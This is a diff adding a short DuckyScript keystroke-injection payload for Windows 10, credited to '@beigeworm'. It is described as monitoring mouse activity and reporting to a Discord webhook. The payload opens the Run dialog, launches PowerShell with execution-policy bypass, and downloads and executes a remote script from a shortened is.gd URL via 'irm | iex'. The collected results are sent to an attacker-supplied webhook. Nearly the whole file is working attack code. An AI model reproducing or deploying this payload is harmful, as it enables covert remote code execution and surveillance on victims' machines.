@@ -1,0 +1,18 @@
+
+REM Title: beigeworm's monitor mouse activity to Discord Webhook.
+REM Author: @beigeworm
+REM Description: This script monitors mouse activity and posts results to a discord webhook.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook Channel and Token ONLY 
+REM eg. $dc='1206563651960586035/sNqypsq629XmXpc9TP924Dxeox6qMHDCI5e27qJ3fw4ef34wff4wf_df3aFOY' ....
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/bw_mm_to_dc | iex
+ENTER
+
+
